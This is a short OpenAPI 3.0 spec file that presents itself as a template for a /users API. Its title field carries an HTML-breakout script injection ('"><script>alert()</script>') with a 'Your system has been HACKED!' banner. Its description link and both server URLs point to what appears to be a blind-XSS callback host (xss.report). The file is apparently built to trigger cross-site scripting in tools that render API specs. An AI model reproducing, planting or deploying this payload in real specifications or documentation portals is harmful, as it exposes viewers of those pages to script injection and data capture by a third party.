openapi: 3.0.0
info:
  title: Your system has been HACKED!"><script>alert()</script>
  description: Optional multiline or single-line description in [CommonMark](https://xss.report/c/santiko86) or HTML.
  version: 0.1.9

servers:
  - url: https://xss.report/c/santiko86
    description: Optional server description, e.g. Main (production) server
  - url: https://xss.report/c/santiko86
    description: Optional server description, e.g. Internal staging server for testing
    
paths:
  /users:
    get:
      summary: Returns a list of users.
      description: Optional extended description in CommonMark or HTML.
      responses:
        "200": # status code
          description: A JSON array of user names
          content:
            application/json:
              schema:
                type: array
                items:
                  type: string
